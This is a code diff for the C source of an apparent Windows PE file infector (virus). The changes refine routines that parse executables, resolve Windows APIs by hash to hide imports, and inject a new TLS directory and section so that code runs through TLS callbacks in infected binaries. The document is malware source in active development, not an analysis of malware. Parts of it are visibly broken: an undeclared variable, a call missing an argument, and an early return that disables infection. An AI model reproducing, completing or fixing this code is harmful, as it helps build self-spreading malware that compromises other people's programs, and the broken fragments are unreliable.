@@ -59,6 +59,7 @@ typedef char * (* strncatHeader)(char *, const char *, size_t);
 typedef int (* strnicmpHeader)(const char *, const char *, size_t);
 typedef size_t (* strlenHeader)(const char *);
 typedef void * (* memcpyHeader)(void *, const void *, size_t);
+typedef void * (* memsetHeader)(void *, int, size_t);
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
 typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
@@ -81,6 +82,7 @@ typedef struct __InfectorIAT
    strnicmpHeader strnicmp;
    strlenHeader strlen;
    memcpyHeader memcpy;
+   memsetHeader memset;
 
    /* kernel32 */
    LoadLibraryAHeader loadLibrary;
@@ -124,6 +126,7 @@ CVector cvector_alloc(InfectorIAT *iat, size_t type_size, size_t elements)
 
    result.elements = elements;
    result.data = iat->malloc(CVECTOR_BYTES(&result));
+   iat->memset(result.data, 0, CVECTOR_BYTES(&result));
    return result;
 }
 
@@ -132,6 +135,7 @@ void cvector_free(InfectorIAT *iat, CVector *vector)
    if (vector == NULL || vector->data == NULL)
       return;
 
+   iat->memset(vector->data, 0, CVECTOR_BYTES(vector));
    iat->free(vector->data);
    vector->data = NULL;
    vector->elements = 0;
@@ -147,9 +151,13 @@ void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
       cvector_free(iat, vector);
       return;
    }
-   
+
+   size_t old_elements = vector->elements;
    vector->elements = elements;
    vector->data = iat->realloc(vector->data, CVECTOR_BYTES(vector));
+
+   if (old_elements < elements)
+      iat->memset(CVECTOR_CAST(vector, uint8_t *)+(vector->type_size * old_elements), 0, (elements - old_elements) * vector->type_size);
 }
 
 void cvector_insert(InfectorIAT *iat, CVector *vector, size_t index, void *element)
@@ -252,6 +260,21 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
    return NULL;
 }
 
+DWORD rva_to_offset(CVector *module, DWORD rva)
+{
+   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
+   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+
+   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
+   {
+      if (rva >= section_table[i].VirtualAddress && rva < section_table[i].VirtualAddress+section_table[i].Misc.VirtualSize)
+         return rva - section_table[i].VirtualAddress + section_table[i].PointerToRawData;
+   }
+
+   return 0;
+}
+
 CVector infect_32bit(InfectorIAT *iat, CVector *module)
 {
    uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
@@ -309,7 +332,8 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
 
    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0)
    {
-      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY64,byte_module+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY64,byte_module+rva_to_offset(module,
+                                                                                  nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress));
       iat->memcpy(&new_tls_directory, old_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
    }
 
@@ -320,13 +344,13 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    {
       cvector_realloc(iat, &tls_data, old_tls_directory->EndAddressOfRawData - old_tls_directory->StartAddressOfRawData);
       DWORD data_rva = old_tls_directory->StartAddressOfRawData - nt_headers->OptionalHeader.ImageBase;
-      iat->memcpy(tls_data.data, byte_module+data_rva, tls_data.elements);
+      iat->memcpy(tls_data.data, byte_module+rva_to_offset(module, data_rva), tls_data.elements);
    }
 
    if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
    {
       DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
-      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+callback_rva);
+      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+rva_to_offset(callback_rva));
 
       do
       {
@@ -384,6 +408,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    
    nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
    nt_headers->OptionalHeader.SizeOfImage = 0;
+   DWORD lowest_rva = 0xFFFFFFFF;
 
    for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
    {
@@ -392,7 +417,12 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
       if (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment != 0)
          nt_headers->OptionalHeader.SizeOfImage +=
             nt_headers->OptionalHeader.SectionAlignment - (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment);
+
+      if (section_table[i].VirtualAddress < lowest_rva)
+         lowest_rva = section_table[i].VirtualAddress;
    }
+
+   nt_headers->OptionalHeader.SizeOfImage += lowest_rva;
 
    CVector new_section_data = cvector_alloc(iat, sizeof(uint8_t), new_section->SizeOfRawData);
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
@@ -484,12 +514,15 @@ void load_infector_iat(InfectorIAT *iat)
    PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
    iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
    printf("WriteFile: 0x%08x", fnv321a("WriteFile"));
+   printf("memset: 0x%08X", fnv321a("memset"));
 }
 
 int infect(void)
 {
    InfectorIAT iat;
    load_infector_iat(&iat);
+
+   return 0;
 
 #ifdef BROODSACDEBUG
    // TODO make this a compiler-controlled variable that points at our built executables
